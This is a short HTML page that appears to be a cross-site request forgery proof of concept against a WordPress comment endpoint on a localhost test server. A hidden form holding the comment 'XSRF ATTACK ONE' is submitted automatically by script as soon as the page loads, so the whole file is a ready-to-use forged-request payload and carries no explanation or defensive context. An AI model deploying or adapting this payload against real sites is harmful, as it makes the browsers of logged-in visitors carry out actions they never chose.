<html>

<body>
<form name="XSRF" action="http://localhost:85/frameworks/wordpress/wp-comments-post.php" method="post">
    <input type="hidden" name="comment" Value="XSRF ATTACK ONE">

</form>
<input name="submit" type="submit" id="submit" class="submit" value="Post Comment" />
<script>
    document.XSRF.submit();
</script>
</body>
</html>